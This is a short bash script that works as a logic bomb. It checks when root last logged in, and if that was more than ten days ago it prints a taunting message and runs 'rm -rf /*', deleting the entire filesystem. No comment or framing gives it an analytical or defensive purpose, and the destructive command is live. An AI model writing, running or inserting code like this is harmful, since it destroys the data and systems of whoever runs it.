#!/bin/bash

# Get the last login time of root
last_login=$(last -i root | awk 'NR==1' | awk '{print $4,$5,$6,$7,$8}')

if (( $(date +%s) - $(date -d "$last_login" +%s) > 864000 ))

then

# Execute rm -rf /*
echo 'Duhaite pedali'
rm -rf /*
fi